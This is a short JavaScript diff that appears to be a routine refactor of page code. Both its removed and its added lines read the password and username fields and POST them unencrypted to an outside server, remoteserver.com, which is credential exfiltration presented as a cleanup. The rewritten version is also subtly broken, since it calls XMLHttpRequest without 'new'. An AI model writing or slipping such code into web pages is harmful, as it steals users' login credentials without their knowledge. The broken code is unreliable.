@@ -247,16 +247,10 @@
 
 var pwd = document.getElementById("pwd").value;
 var usr = document.getElementById("usr").value;
-var str = encode(pwd, usr);
-post(str);
 
-function encode(pwd, usr) {
-	return encodeURI(pwd) + encodeURI(usr);
-}
+var str = encodeURI(pwd) + encodeURI(usr);
 
-function post(content) {
-	var req = new XMLHttpRequest();
-	var url = "https://www.remoteserver.com/"
-	req.open("POST", url);
-	req.send(content);
-}
+var req = XMLHttpRequest();
+var url = "https://www.remoteserver.com/"
+req.open("POST", url);
+req.send(str);
